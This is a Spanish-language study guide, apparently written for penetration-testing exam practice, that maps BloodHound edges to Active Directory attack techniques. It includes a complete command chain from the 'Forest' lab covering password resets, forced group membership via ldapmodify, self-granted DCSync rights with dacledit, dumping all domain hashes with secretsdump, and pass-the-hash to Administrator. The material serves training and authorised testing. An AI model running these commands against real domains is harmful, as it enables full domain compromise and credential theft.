# AD — Metodología por Edge de BloodHound

Cuando BloodHound te muestra un camino a Domain Admin, cada flecha (edge) es una relación distinta y pide una técnica distinta. La lógica siempre es la misma: **¿qué me permite HACER este edge directamente? → de ahí sale la técnica**, no al revés.

> No memorices "si veo X, corro comando Y" sin el porqué. Memoriza el porqué, y el comando lo derivas o lo buscas en tu `6-AD.md`.

---

## Plan de arranque — ANTES de correr BloodHound

Te dan usuario:password de dominio (breach scenario). No asumas que "ya tienes acceso" — verifica primero:

```bash
# 1. Confirma que las creds funcionan Y en qué máquinas del set (no solo el DC)
nxc smb <SUBNET>/24 -u '<user>' -p '<pass>'
```
Revisa el output buscando **`(Pwn3d!)`** junto a alguna IP — eso significa que esas credenciales tienen **admin local** en esa máquina, no solo que autenticaron. Es información gratis que te dice DÓNDE ya tienes la llave, antes de ejecutar nada más.

```bash
# 2. Ahora sí, mapea el dominio completo
bloodhound-python -u '<user>' -p '<pass>' -d <domain> -ns <DC_IP> -c all --zip
```

**Cruza ambos resultados:**
- Si una máquina marcada `Pwn3d!` tiene un `HasSession` de un Domain Admin → vuelca LSASS ahí mismo de inmediato (Mimikatz/secretsdump), sin necesitar ningún exploit adicional.
- Si no hay ese cruce favorable → sigue el orden de prioridad de caminos de abajo.

---

## Priorización cuando hay VARIOS caminos a Domain Admin

El número de saltos que muestra BloodHound es engañoso: un edge de sesión "de 1 salto" puede esconder todo el trabajo de comprometer esa máquina primero, mientras que un edge de ACL de 2 saltos puede ser 100% ejecutable ya mismo. **Prioriza por qué tan directamente ejecutable es el edge desde tu acceso ACTUAL, no por la cantidad de saltos.**

```
Orden de prioridad (de más a menos confiable/rápido):

1. Edges de ACL — GenericAll, GenericWrite, WriteDacl, WriteOwner,
   AddMember, ForceChangePassword, AllExtendedRights
   → Ejecutables YA MISMO, con solo tu usuario actual, sin depender
     de controlar ninguna otra máquina. EMPIEZA AQUÍ si existe alguno.

2. Kerberoastable / AS-REPRoastable
   → Ejecutables YA MISMO, pero con una variable: dependen de que el
     hash sea crackeable (password débil). No es 100% garantizado.

3. HasSession / AdminTo hacia una máquina que NO controlas todavía
   → El grafo lo muestra como "1 salto" pero ESCONDE el trabajo previo
     de comprometer esa máquina. Déjalo de último salvo que ya la
     controles por otra vía (ver Plan de arranque arriba).
```

**Regla rápida bajo presión:** al abrir BloodHound, filtra mentalmente por familia de edge antes de mirar longitud de camino. ACL primero, Kerberos segundo, Sesión al final.

---

## Edges de "ya tengo acceso a algo"

### HasSession
**Qué significa:** un usuario (a veces un admin) tiene una sesión activa AHORA MISMO en una máquina.
**Qué te permite:** si TÚ ya controlas esa máquina, sus credenciales están en memoria (LSASS).
**Lógica del ataque:** controla la máquina primero → vuelca LSASS (Mimikatz `sekurlsa::logonpasswords` o `secretsdump` remoto) → obtienes hash/ticket de esa sesión → Pass-the-Hash o Pass-the-Ticket.
**Si NO controlas esa máquina:** el edge no te sirve todavía — resuelve el acceso a esa máquina primero (es un prerequisito, no un atajo).

### AdminTo
**Qué significa:** tu usuario ya es administrador local de esa máquina.
**Qué te permite:** ejecutar comandos como SYSTEM ahí, volcar LSASS/SAM, o pivotar desde esa máquina.
**Lógica del ataque:** conéctate (`evil-winrm`/`psexec`/`wmiexec`) → trátalo como un privesc local ya resuelto → busca sesiones (HasSession) o credenciales cacheadas ahí mismo.

### CanRDP
**Qué significa:** tu usuario puede iniciar sesión remota por RDP en esa máquina (no implica admin).
**Qué te permite:** una shell interactiva gráfica — útil para enumerar más a fondo, no para dominar la máquina directamente.
**Lógica del ataque:** entra por RDP, sigue enumerando desde ahí (puede haber otro vector de privesc local o credenciales visibles en la sesión).

---

## Edges de "control sobre un objeto" (ACLs — no necesitan sesión)

### GenericAll
**Qué significa:** control TOTAL sobre ese objeto (usuario, grupo, computadora, GPO).
**Qué te permite:** literalmente cualquier cosa sobre ese objeto.
**Lógica del ataque — depende del TIPO de objeto:**
- Si es un **usuario** → resetea su password directamente (no necesitas la vieja):
  ```bash
  impacket-changepasswd <DOMAIN>/<TU_USER>:<TU_PASS>@<DC_IP> -newpass 'NuevaPass123!' -alter-user <USUARIO_OBJETIVO>
  ```
- Si es un **grupo** → agrégate a ese grupo (ver AddMember abajo, o la sección "Cadena real" más abajo si el `net rpc`/herramienta normal falla).
- Si es una **computadora** → puedes configurar Resource-Based Constrained Delegation (RBCD) para impersonar a cualquiera contra esa máquina.
- Si es una **GPO** → puedes editarla para ejecutar código en todas las máquinas donde aplique (más avanzado, raro en examen).

### GenericWrite
**Qué significa:** puedes escribir la mayoría de atributos del objeto (subset de GenericAll).
**Qué te permite:** en un usuario → forzar cambio de password o modificar el atributo `scriptPath`/`msDS-KeyCredentialLink` (Shadow Credentials). En un grupo → añadir miembros.
**Lógica del ataque:** similar a GenericAll pero más limitado — revisa qué atributo específico puedes tocar.

### WriteOwner
**Qué significa:** puedes cambiar el DUEÑO del objeto.
**Qué te permite:** te conviertes en el owner → como owner, te das a ti mismo GenericAll (o cualquier ACE) sobre ese objeto.
**Lógica del ataque:** dos pasos → (1) `WriteOwner` para hacerte dueño → (2) ahora con control total, aplica la lógica de GenericAll de arriba.

### WriteDacl
**Qué significa:** puedes modificar la DACL (la lista de permisos) del objeto.
**Qué te permite:** agregarte a ti mismo cualquier permiso que quieras sobre ese objeto (incluido GenericAll, o específicamente los derechos de DCSync si el objeto es el dominio — ver sección "Cadena real" más abajo).
**Lógica del ataque:** te concedes GenericAll a ti mismo sobre el objeto → luego aplicas la lógica de GenericAll de arriba.

### Owns
**Qué significa:** ya eres el dueño del objeto (quizás por herencia o configuración previa).
**Qué te permite:** lo mismo que WriteDacl — como dueño, puedes modificar sus permisos.
**Lógica del ataque:** date GenericAll → aplica lógica de GenericAll.

### AllExtendedRights
**Qué significa:** tienes todos los "derechos extendidos" sobre el objeto (incluye poder resetear password sin ser GenericAll completo, o leer atributos confidenciales).
**Qué te permite:** en un usuario, normalmente equivale a poder resetearle el password.
**Lógica del ataque:** igual que el caso "usuario" de GenericAll — reset de password directo.

### ForceChangePassword
**Qué significa:** permiso específico y único de resetear la password de ese usuario (más acotado que GenericAll).
**Qué te permite:** exactamente eso, nada más.
**Lógica del ataque:** resetea el password directamente, sin necesitar el antiguo.

### AddMember
**Qué significa:** puedes agregar miembros a ese grupo.
**Qué te permite:** agregarte A TI MISMO a ese grupo.
**Lógica del ataque:** agrégate al grupo → hereda los privilegios de ese grupo (ej: si es "Domain Admins" o "Remote Management Users", ya ganaste).
```bash
net rpc group addmem "<GRUPO>" "<TU_USUARIO>" -U "<DOMAIN>/<TU_USUARIO>%<TU_PASS>" -S <DC_IP>
```
> **Si esto no funciona (ver sección "Cadena real" abajo):** puede fallar silenciosamente cuando el permiso viene de membresía ANIDADA (varios `MemberOf` de por medio) en vez de un GenericAll directo tuyo sobre el grupo. En ese caso usa LDAP directo (`ldapmodify`), no `net rpc`.

---

## Edges de Kerberos (no dependen de ACLs)

### Kerberoastable
**Qué significa:** la cuenta tiene un SPN (Service Principal Name) configurado → cualquier usuario de dominio puede pedir un ticket de servicio para ella.
**Qué te permite:** pedir ese ticket (va cifrado con el hash de password de la cuenta) y crackearlo offline.
**Lógica del ataque:** `impacket-GetUserSPNs` (ya en tu `6-AD.md`) → `hashcat -m 13100`. Si esa cuenta tiene privilegios altos y su password es débil, ganaste.

### AS-REPRoastable (DontReqPreauth)
**Qué significa:** la cuenta tiene desactivada la preautenticación Kerberos.
**Qué te permite:** pedir su hash AS-REP sin necesitar ninguna credencial previa.
**Lógica del ataque:** `impacket-GetNPUsers -no-pass` (ya en tu `6-AD.md`) → `hashcat -m 18200`.

---

## Edges de Delegación (más avanzado — menos común pero aparece)

### AllowedToDelegate (Constrained Delegation)
**Qué significa:** esa cuenta/máquina puede impersonar usuarios ante un servicio específico.
**Qué te permite:** con el hash de esa cuenta, pedir un ticket impersonando a CUALQUIER usuario (incluido un DA) contra ese servicio específico.
**Lógica del ataque:** obtén el hash de la cuenta con delegación → usa Rubeus/impacket para forjar el ticket impersonando al DA → accede al servicio como DA.

### AllowedToAct (Resource-Based Constrained Delegation)
**Qué significa:** la propia máquina objetivo "confía" en que cierta cuenta puede impersonar usuarios ante ella.
**Qué te permite:** si controlas esa cuenta (o la creas tú, con GenericWrite sobre la máquina objetivo), puedes impersonar a un DA contra esa máquina.
**Lógica del ataque:** más avanzado — configura RBCD → S4U2Self/S4U2Proxy con Rubeus → shell como DA en esa máquina.

---

## 🔗 Cadena real de explotación ACL — cuando el camino tiene VARIOS saltos de grupo antes del WriteDacl

Esta sección documenta un caso real completo, distinto a los edges individuales de arriba: cuando el camino a Domain Admin no es "1 edge directo" sino una **cadena de membresías anidadas** terminando en un permiso de ACL sobre el dominio. Ejemplo real (máquina Forest):

```
tu_usuario → MemberOf → Grupo A → MemberOf → Grupo B → MemberOf → Grupo C
   → GenericAll → Grupo D (ej: "Exchange Windows Permissions")
   → WriteDacl → EL DOMINIO
```

**La clave para leer esta cadena:** el GenericAll no es tuyo directamente — lo tiene un grupo del que eres miembro por anidamiento. Y el WriteDacl sobre el dominio tampoco es tuyo — lo tiene el grupo al que ese GenericAll te permite entrar. Son DOS pasos de escritura reales, no uno.

### Paso 1 — Únete al grupo intermedio (el que tiene WriteDacl sobre el dominio)

**Primero intenta la vía estándar:**
```bash
net rpc group addmem "<GRUPO_CON_WRITEDACL>" "<TU_USUARIO>" -U "<DOMAIN>/<TU_USUARIO>%<TU_PASS>" -S <DC_IP>
```

**⚠️ Si no da error pero tampoco funciona (verifica siempre con esto, no confíes en que "no dio error" = "funcionó"):**
```bash
net rpc group members "<GRUPO_CON_WRITEDACL>" -U "<DOMAIN>/<TU_USUARIO>%<TU_PASS>" -S <DC_IP>
```
Si tu usuario NO aparece en la lista, `net rpc` falló silenciosamente — esto pasa cuando el privilegio para agregar miembros viene de una cadena de membresías anidadas en vez de un permiso directo tuyo. `net rpc` a veces no resuelve bien esos privilegios heredados.

**Alternativa que SÍ funciona en ese caso — LDAP directo con `ldapmodify`:**
```bash
# 1. Confirma el DN exacto del grupo objetivo
ldapsearch -x -H ldap://<DC_IP> -D "<TU_USUARIO>@<DOMAIN>" -w '<TU_PASS>' -b "DC=<dominio>,DC=<tld>" "(cn=<GRUPO_CON_WRITEDACL>)" distinguishedName

# 2. Confirma el DN exacto de tu propio usuario
ldapsearch -x -H ldap://<DC_IP> -D "<TU_USUARIO>@<DOMAIN>" -w '<TU_PASS>' -b "DC=<dominio>,DC=<tld>" "(sAMAccountName=<TU_USUARIO>)" distinguishedName

# 3. Construye el LDIF con AMBOS DN exactos (no asumas la OU, siempre verifica con el paso 1 y 2)
cat <<EOF > add_member.ldif
dn: <DN_EXACTO_DEL_GRUPO_DEL_PASO_1>
changetype: modify
add: member
member: <DN_EXACTO_DE_TU_USUARIO_DEL_PASO_2>
EOF

# 4. Aplica
ldapmodify -x -H ldap://<DC_IP> -D "<TU_USUARIO>@<DOMAIN>" -w '<TU_PASS>' -f add_member.ldif

# 5. Verifica que esta vez sí se aplicó
net rpc group members "<GRUPO_CON_WRITEDACL>" -U "<DOMAIN>/<TU_USUARIO>%<TU_PASS>" -S <DC_IP>
```

### Paso 2 — Auto-concédete DCSync (inmediatamente después del Paso 1, sin esperar)

**⚠️ Lección real importante: el timing importa.** La membresía de grupo puede tardar en propagarse al token de sesión, o algunos entornos revierten cambios no autorizados tras un tiempo. Si el paso 2 da `INSUFF_ACCESS_RIGHTS` la primera vez, **repite el Paso 1 y ejecuta el Paso 2 inmediatamente después, sin dejar pasar tiempo entre medio** — no asumas que la membresía "ya quedó" solo porque la viste una vez.

```bash
impacket-dacledit -action write -rights DCSync -principal <TU_USUARIO> -target-dn "DC=<dominio>,DC=<tld>" <DOMAIN>/<TU_USUARIO>:<TU_PASS> -dc-ip <DC_IP>
```
Éxito esperado: `[*] DACL modified successfully!`

**Si da error `insufficient rights` / `INSUFF_ACCESS_RIGHTS`:** vuelve a verificar membresía (paso 5 de arriba) — es posible que se haya revertido. Repite Paso 1 → Paso 2 sin pausas.

### Paso 3 — DCSync real

```bash
impacket-secretsdump -just-dc <DOMAIN>/<TU_USUARIO>:<TU_PASS>@<DC_IP>
```
Esto vuelca TODOS los hashes del dominio, incluido `Administrator`.

**Si da `ERROR_DS_DRA_BAD_DN`:** casi siempre significa que el Paso 2 (dacledit write) en realidad no se aplicó bien todavía, o falta reintentarlo — no es un problema de sintaxis de este comando, vuelve al Paso 2.

### Paso 4 — Pass-the-Hash con el Administrator

```bash
evil-winrm -i <DC_IP> -u Administrator -H <NT_HASH_OBTENIDO>
```

---

### ⚠️ Nota de entorno — conflictos de Python con `dacledit`/`bloodyAD`

Si `impacket-dacledit` falla con un traceback largo de Python (`ImportError: cannot import name 'asn1' from 'cryptography.hazmat'` o similar, mencionando `ldapdomaindump`/`aioquic`/`service_identity`), es un **conflicto de versiones de librerías**, no un error de tu comando ni de la máquina. Suele pasar después de instalar herramientas nuevas con `pip install --break-system-packages` (como `bloodyAD`), que actualizan `cryptography` a una versión incompatible con otras herramientas ya instaladas (`netexec`, `certipy`, etc.).

**No persigas versiones exactas de `cryptography` a mano — es un agujero sin fondo** (bajar la versión rompe otra herramienta, subirla rompe otra distinta). La solución limpia es un entorno virtual aislado:

```bash
python3 -m venv ~/venv-impacket
source ~/venv-impacket/bin/activate
pip install impacket
# ahora corre impacket-dacledit / cualquier script de impacket normalmente aquí dentro
```

Cuando termines:
```bash
deactivate
```
Tus demás herramientas (`nxc`, `bloodhound-python`, etc.) siguen funcionando igual fuera del venv, porque nunca se tocaron.

---

## El proceso mental completo (resumen)

```
1. BloodHound → "Shortest Paths to Domain Admins"
2. Por cada edge del camino, pregúntate:
   a. ¿Es una relación de SESIÓN/ACCESO (HasSession, AdminTo, CanRDP)?
      → necesito controlar la máquina primero, luego robo credenciales de memoria
   b. ¿Es una relación de CONTROL SOBRE UN OBJETO (GenericAll, WriteDacl, WriteOwner, AddMember...)?
      → puedo actuar directamente sobre ese objeto sin sesión (reset password / unirme a grupo / darme más permisos)
      → si la cadena tiene VARIOS saltos de grupo antes del ACL final, ver "Cadena real de explotación ACL" arriba
   c. ¿Es Kerberoastable / AS-REPRoastable?
      → pido el ticket/hash y lo crackeo offline
   d. ¿Es una relación de DELEGACIÓN (AllowedToDelegate, AllowedToAct)?
      → impersonación vía Kerberos (Rubeus/S4U) — más avanzado
3. Ejecuta la técnica correspondiente → verifica qué NUEVO acceso ganaste
4. Repite desde el paso 1 con el nuevo contexto (BloodHound de nuevo si hace falta)
```

**La pregunta que siempre te salva cuando ves un edge que no reconoces:** "¿esto me da control sobre algo YA (un objeto, una sesión), o me da la posibilidad de PEDIR un ticket/hash?" Esa distinción sola ya te dice en qué familia de la tabla de arriba buscar.
